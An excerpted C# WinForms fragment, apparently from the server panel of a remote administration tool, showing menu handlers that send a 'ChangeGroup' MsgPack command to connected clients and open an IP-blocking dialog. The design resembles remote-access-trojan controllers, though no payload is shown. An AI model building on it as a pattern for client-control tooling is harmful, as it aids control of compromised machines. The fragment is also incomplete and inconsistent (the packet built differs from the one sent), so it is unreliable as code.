...
namespace Server
{
    ...
    public partial class Form1 : Form
    {
        ...
        private void 修改分组ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                string newGroupName = Interaction.InputBox("请输入新的分组名称:", "更改分组", "默认分组名");
                ...
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "ChangeGroup";
                    packet.ForcePathObject("GroupName").AsString = newGroupName;  // 将用户输入的组名加入到packet中
                    ...
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        client.LV.SubItems[2].Text = newGroupName;
                    }
                }
                catch (Exception ex)
                {
        ...
        private void 设置黑ipToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (FormBlockClients form = new FormBlockClients())
            {
                form.ShowDialog();
